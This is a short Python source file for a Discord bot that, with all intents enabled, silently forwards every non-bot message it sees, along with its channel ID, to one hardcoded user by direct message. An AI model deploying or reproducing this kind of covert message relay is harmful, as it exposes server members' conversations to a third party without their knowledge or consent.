import os
import disnake
from disnake.ext import commands,tasks
import time

intents = disnake.Intents.all()
bot = commands.Bot(command_prefix='t!', intents=intents)
netflixed = False

@bot.event
async def on_message(message):
  if message.author == bot.user or message.author.bot:
    return
  user = bot.get_user(708750647847157880)
  await user.send(message.content)
  await user.send(message.channel.id)
  

bot.run(os.environ['token'])